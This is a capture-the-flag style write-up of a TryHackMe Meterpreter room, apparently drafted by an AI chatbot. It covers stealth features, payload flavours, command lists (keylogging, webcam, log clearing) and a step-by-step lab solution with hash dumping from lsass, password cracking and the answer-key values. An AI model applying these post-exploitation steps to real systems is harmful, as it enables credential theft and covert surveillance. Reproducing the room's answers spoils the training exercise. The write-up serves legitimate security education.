
# üõ†Ô∏è **Metasploit: Meterpreter**

*Deep dive into Meterpreter, how it works, its flavors, commands, and post-exploitation power.*

---

# ## **Task 1 ‚Äî Introduction to Meterpreter**

**Meterpreter** is a specialized Metasploit payload used heavily during penetration testing. It provides:

* An in-memory agent (no file dropped to disk)
* Encrypted communication
* Stealthy command execution
* Access to the OS, files, processes, and post-exploitation modules
* A modular extension system (Python, Kiwi, etc.)

---

## üß† **How Does Meterpreter Work?**

* Runs **entirely in memory**, NOT written to disk
  ‚Üí Helps avoid antivirus detection
* Uses **encrypted channels** (TLS)
  ‚Üí Helps evade IDS/IPS detection
* Appears as a **legitimate process**, not ‚Äúmeterpreter.exe‚Äù
  ‚Üí More stealth

Example in the lesson:
The target was exploited using **MS17-010**, giving a Meterpreter session running under a process with PID **1304**, which turns out to be **spoolsv.exe**, not a suspicious name.

---

## üìå **Command: `getpid`**

```
meterpreter > getpid
Current pid: 1304
```

**Purpose:**
Shows which process Meterpreter is currently injected into.
This helps determine stealth / privileges and identifies good migration targets later.

---

## üìå **Command: `ps`**

```
meterpreter > ps
```

**Purpose:**
Lists **all running processes** on the target system.
Use it to:

* Identify high-privilege processes
* Find `lsass.exe` (for hashdump)
* Plan migration
* Check AV services, system tasks, etc.

In the screenshot, PID **1304** corresponds to:

```
spoolsv.exe
```

A legitimate Windows print service ‚Äî perfect camouflage.

---

## üìå **Inspecting DLLs Used by the Meterpreter Host Process**

Command shown:

```
tasklist /m /fi "pid eq 1304"
```

**Purpose:**
Lists all DLLs loaded into the target process (here, spoolsv.exe).
Shows that nothing obvious like *meterpreter.dll* appears ‚Äî supporting Meterpreter‚Äôs stealth via reflective injection.

---

## üîê **Stealth Takeaways**

* Meterpreter hides inside a legitimate process
* Reflective DLL injection keeps files off disk
* TLS communication avoids network detection

‚úî No answer required in this task.

---

# ## **Task 2 ‚Äî Meterpreter Flavors**

Meterpreter payloads come in many versions depending on:

* Operating system
* Architecture
* Staged vs. Inline
* Connection type (TCP, HTTP, HTTPS)
* Payload size constraints
* Network environment restrictions

---

## üß± **Staged vs. Inline Payloads Recap**

### **Staged**

* Small initial stub (`stager`) delivered first
* Loads the large Meterpreter payload (the `stage`) afterward
* Useful when size matters or shellcode limits exist

### **Inline (single)**

* Full payload delivered at once
* No additional network request
* Larger, less stealthy, but more stable

---

## üìå **Listing All Meterpreter Payloads**

Command shown:

```
msfvenom --list payloads | grep meterpreter
```

**Purpose:**
Displays all payloads that include "meterpreter" in their name.

THM‚Äôs output showed payloads for:

* **Android**
* **Apple iOS / OSX**
* **Java**
* **Linux**
* **PHP**
* **Python**
* **Windows**

---

## üéØ **Choosing the Right Meterpreter Flavor**

Depends on:

1. **Target operating system**
2. **Components available**

   * PHP server? Python installed?
3. **Network restrictions**

   * RAW TCP allowed?
   * HTTPS required?
   * IPv6 only?

---

## üìå **Default Meterpreter Payloads for Certain Exploits**

Example from MS17-010:

```
use exploit/windows/smb/ms17_010_eternalblue
```

Metasploit auto-selects:

```
windows/x64/meterpreter/reverse_tcp
```

---

## üìå **Listing Compatible Payloads for a Module**

```
show payloads
```

**Purpose:**
Shows all payloads usable with a specific exploit module.

---

‚úî No answer required for this task.

---

# ## **Task 3 ‚Äî Meterpreter Commands**

Typing:

```
meterpreter > help
```

Displays **all Meterpreter command categories**.

---

## üß† Meterpreter Command Categories

* Core commands
* File system commands
* Networking commands
* System commands
* Webcam commands
* Audio commands
* User interface commands
* Elevation commands
* Password database commands
* Timestomp commands
* (Extensions add more)

---

# ### **üìå Core Commands (with explanations)**

| Command      | Purpose                                     |
| ------------ | ------------------------------------------- |
| `background` | Sends the Meterpreter session to background |
| `bg`         | Alias of background                         |
| `bgkill`     | Kills background scripts                    |
| `bglist`     | Lists running background scripts            |
| `bgrun`      | Run a Meterpreter script in background      |
| `channel`    | Manage active channels                      |
| `close`      | Close a channel                             |
| `exit`       | Terminates Meterpreter session              |
| `guid`       | Get session GUID                            |
| `help`       | Shows command categories                    |
| `info`       | View information about a post module        |
| `irb`        | Ruby interactive shell on the target        |
| `migrate`    | Migrate Meterpreter to another process      |
| `run`        | Executes a Meterpreter script or module     |
| `sessions`   | Switch or manage sessions                   |

---

# ### **üìÇ File System Commands**

* `cd` ‚Üí change directory
* `ls` ‚Üí list directory contents
* `pwd` ‚Üí show working directory
* `edit` ‚Üí open text editor
* `cat` ‚Üí print file contents
* `rm` ‚Üí delete file
* `search` ‚Üí find files by keyword
* `upload` ‚Üí upload file to target
* `download` ‚Üí download file from target

---

# ### **üåê Networking Commands**

* `arp` ‚Üí ARP cache
* `ifconfig` ‚Üí network interface info
* `netstat` ‚Üí active connections
* `portfwd` ‚Üí port forward
* `route` ‚Üí routing table

---

# ### **üñ•Ô∏è System Commands**

* `clearev` ‚Üí clear event logs
* `execute` ‚Üí run a system command
* `getpid` ‚Üí show Meterpreter PID
* `getuid` ‚Üí show current user
* `kill` ‚Üí kill process
* `ps` ‚Üí list processes
* `reboot` ‚Üí reboot computer
* `shell` ‚Üí drop into CMD/SH
* `shutdown` ‚Üí shutdown machine
* `sysinfo` ‚Üí OS information

---

# ### **üé• Other Commands (These will be listed under different menus categories in the help menu**

Includes:

* `idletime` ‚Üí Returns the number of seconds the remote user has been idle
* `keyscan_dump` ‚Üí Dumps the keystroke buffer
* `keyscan_start` ‚Üí Starts capturing keystrokes
* `keyscan_stop` ‚Üí Stops capturing keystrokes
* `screenshare` ‚Üí Allows you to watch the remote user's desktop in real time
* `screenshot` ‚Üí Grabs a screenshot of the interactive desktop
* `record_mic` ‚Üí Records audio from the default microphone for X seconds
* `webcam_chat` ‚Üí Starts a video chat
* `webcam_list` ‚Üí Lists webcams
* `webcam_snap` ‚Üí Takes a snapshot from the specified webcam
* `webcam_stream` ‚Üí Plays a video stream from the specified webcam
* `getsystem` ‚Üí Attempts to elevate your privilege to that of local system
* `hashdump` ‚Üí Dumps the contents of the SAM database

Although all these commands may seem available under the help menu, they may not all work due to target system not having a webcam or it can be running on a virtual maching without proper desktop environment.

‚úî No answer required.

---

# ‚≠ê **Metasploit_Meterpreter.md (PART 2/2)**

This continues directly from Part 1 and completes your full GitHub-ready Markdown file.

---

# ## **Task 4 ‚Äî Post-Exploitation with Meterpreter**

Meterpreter includes many commands that assist during **post-exploitation**, including privilege reconnaissance, credential extraction, process migration, file search, lateral movement, and more.

Many commands here overlap with Task 3 but are demonstrated within real-world post-exploitation context.

---

## üß† **Help Menu**

```
meterpreter > help
```

Shows all available commands for the current Meterpreter version.
Different flavors of Meterpreter have different sets of commands, so always check the help menu after loading extensions like **python**, **kiwi**, or others.

---

## üìå `getuid` ‚Äî Determine Current Privileges

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**Purpose:**
Shows which user Meterpreter is currently running as.
Useful for identifying privilege level ‚Üí SYSTEM, Administrator, or low-priv.

---

## üìå `ps` ‚Äî Enumerate Processes

```
meterpreter > ps
```

**Purpose:**
Lists all processes.
You use this info to:

* Identify **lsass.exe** for credential extraction
* Identify potential migration targets
* Spot AV/EDR processes
* Understand system activity

---

## üìå **Migration**

Migration moves your Meterpreter session into another process.

Example from THM:

```
meterpreter > migrate 716
```

**Purpose:**

* Increase stability
* Gain higher privileges
* Position yourself inside a process that has credentials/tokens
* Hide inside a more legitimate process

‚ö†Ô∏è **Important:**
Migrating from SYSTEM ‚Üí low-priv process can cause privilege loss.

---

## üß™ **Hashdump**

Once migrated into **lsass.exe**, you can extract password hashes:

```
meterpreter > hashdump
```

This dumps the SAM database (NTLM hashes) for all local users.

---

## üîé **Search for Files**

```
meterpreter > search -f flag2.txt
```

Searches recursively for matching filenames.

Useful for:

* CTF flags
* Sensitive configuration files
* Credentials
* Scripts

---

## üñ•Ô∏è **Shell Access**

```
meterpreter > shell
```

Creates a traditional Windows command-line shell on the target.

Exit with:

```
CTRL + Z
```

‚úî No answers needed for Task 4.

---

# ## **Task 5 ‚Äî Post-Exploitation Challenge**

This task required full hands-on Meterpreter usage.
Below is **exactly what you did** for each question, as you requested, merged into a clean GitHub-ready section.

---

# üïµÔ∏è‚Äç‚ôÇÔ∏è **Challenge ‚Äî How Each Question Was Solved**

---

## **1Ô∏è‚É£ What is the computer name?**

**Command used:**

```
meterpreter > sysinfo
```

**Purpose:**
Shows OS version, computer name, architecture, and domain.

**Result:**
`ACME-TEST`

---

## **2Ô∏è‚É£ What is the target domain?**

**Steps performed:**

1. Background the session:

```
background
```

2. Load the domain enumeration module:

```
use post/windows/gather/enum_domain
```

3. Set the session number:

```
set SESSION 1
```

4. Run the module:

```
run
```

**Result:**
`FLASH`

---

## **3Ô∏è‚É£ What is the name of the share likely created by the user?**

**Steps:**

1. Background Meterpreter
2. Load the enum_shares module:

```
use post/windows/gather/enum_shares
```

3. Set the session:

```
set SESSION 1
```

4. Run:

```
run
```

**Result:**
`speedster`

---

## **4Ô∏è‚É£ What is the NTLM hash of the jchambers user?**

**Steps:**

1. List processes to locate **lsass.exe**:

```
meterpreter > ps
```

2. Identify lsass PID (from screenshot example: PID 716)

3. Migrate into lsass:

```
meterpreter > migrate 716
```

4. Dump hashes:

```
meterpreter > hashdump
```

**Result:**
`69596c7aa1e8daee17f8e78870e25a5c`

---

## **5Ô∏è‚É£ What is the cleartext password of the jchambers user?**

**Steps:**

* Took the NTLM hash
* Submitted it to **crackstation.net**

**Result:**
`Trustno1`

---

## **6Ô∏è‚É£ Where is the ‚Äúsecrets.txt‚Äù file located?**

**Command used:**

```
search -f *.txt
search -f secrets.txt
```

**Purpose:**
Finds all `.txt` files, used here to locate secrets.

**Result:**
`c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt`

---

## **7Ô∏è‚É£ What is the Twitter password in ‚Äúsecrets.txt‚Äù?**

**Command used:**

```
cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
```

**Result:**
`KDSvbvsw3849!`

---

## **8Ô∏è‚É£ Where is the ‚Äúrealsecret.txt‚Äù file located?**

**Commands used:**

```
search -f realsecret.txt
```

**Result:**
`c:\inetpub\wwwroot\realsecret.txt`

---

## **9Ô∏è‚É£ What is the real secret?**

**Command used:**

```
cat "c:\inetpub\wwwroot\realsecret.txt"
```

**Result:**
`The Flash is the fastest man alive`

---

# ## **Summary**

This room covered:

* How Meterpreter operates entirely in memory
* Its stealth advantages
* The many available payload variations
* Full command categories
* Post-exploitation workflows
* Hash extraction, privilege escalation steps, file searching, migration
* Use of additional modules like Kiwi and Python
* A final CTF-style challenge using real Meterpreter techniques


Just say the word ‚Äî I can generate any format.
